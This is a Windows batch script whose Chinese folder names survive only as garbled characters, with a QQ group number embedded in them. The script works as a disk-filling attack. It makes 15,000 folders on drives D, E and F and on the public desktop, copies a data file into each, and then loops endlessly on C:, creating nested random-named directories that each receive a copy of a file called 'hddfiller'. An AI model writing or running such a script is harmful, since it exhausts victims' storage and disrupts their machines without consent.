@echo off
echo ��ǰӲ��ģʽ
dir 
cd xcrail
for /l %%a in (1,1,15000) do md d:\С����·�ã���Ⱥ��ƽ������Ⱥ221312284��С����·ƽ���£����ǵ�%%a���ļ��У�
for /l %%a in (1,1,15000) do md e:\С����·�ã���Ⱥ��ƽ������Ⱥ221312284��С����·ƽ���£����ǵ�%%a���ļ��У�
for /l %%a in (1,1,15000) do md f:\С����·�ã���Ⱥ��ƽ������Ⱥ221312284��С����·ƽ���£����ǵ�%%a���ļ��У�
for /l %%a in (1,1,15000) do copy set.xcdata d:\С����·�ã���Ⱥ��ƽ������Ⱥ221312284��С����·ƽ���£����ǵ�%%a���ļ���
for /l %%a in (1,1,15000) do copy set.xcdata e:\С����·�ã���Ⱥ��ƽ������Ⱥ221312284��С����·ƽ���£����ǵ�%%a���ļ���
for /l %%a in (1,1,15000) do copy set.xcdata f:\С����·�ã���Ⱥ��ƽ������Ⱥ221312284��С����·ƽ���£����ǵ�%%a���ļ���
for /l %%a in (1,1,15000) do copy set.xcdata C:\Users\Public\Desktop\С����·�ã���Ⱥ��ƽ������Ⱥ221312284��С����·ƽ���£����ǵ�%%a���ļ���

cd c:
c:
:xctlh
set num=%RANDOM%
md С����·�ã�%num%
copy hddfiller С����·�ã�%num%\hddfiller
cd С����·�ã�%num%
set num=%RANDOM%
md %num%
copy hddfiller %num%\hddfiller
cd %num%
set num=%RANDOM%
md %num%
copy hddfiller %num%\hddfiller
cd %num%
set num=%RANDOM%
md %num%
copy hddfiller %num%\hddfiller
cd %num%
set num=%RANDOM%
md %num%
copy hddfiller %num%\hddfiller
cd %num%
set num=%RANDOM%
md %num%
copy hddfiller %num%\hddfiller
cd %num%
set num=%RANDOM%
md %num%
copy hddfiller %num%\hddfiller
cd %num%
set num=%RANDOM%
md %num%
copy hddfiller %num%\hddfiller
cd %num%
set num=%RANDOM%
md %num%
copy hddfiller %num%\hddfiller
cd %num%
set num=%RANDOM%
md %num%
copy hddfiller %num%\hddfiller
cd %num%

cd ..
cd ..
cd ..
cd ..
cd ..
cd ..
cd ..
cd ..
cd ..
cd ..

goto xctlh